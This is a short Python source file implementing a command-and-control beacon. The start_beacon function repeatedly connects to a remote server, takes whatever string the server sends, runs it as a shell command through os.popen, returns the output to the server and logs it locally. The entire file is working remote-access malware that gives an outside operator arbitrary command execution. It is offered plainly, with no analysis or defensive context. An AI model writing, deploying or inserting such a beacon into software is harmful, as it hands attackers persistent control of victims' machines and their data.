import socket
import time
import os
from datetime import datetime

def start_beacon(server_ip, server_port, interval=10):
    log_file = "outputs/beacon_log.txt"

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server_ip, server_port))
                s.sendall(b"[+] Beacon: Online\n")
                response = s.recv(4096).decode().strip()

                if response:
                    log_entry = f"[{datetime.now()}] Received: {response}\n"
                    print(log_entry.strip())

                    output = os.popen(response).read()
                    if not output:
                        output = "[!] No output\n"
                    s.sendall(output.encode())

                    with open(log_file, "a") as f:
                        f.write(log_entry)
                        f.write(output + "\n")

        except Exception as e:
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now()}] Connection failed: {e}\n")

        time.sleep(interval)
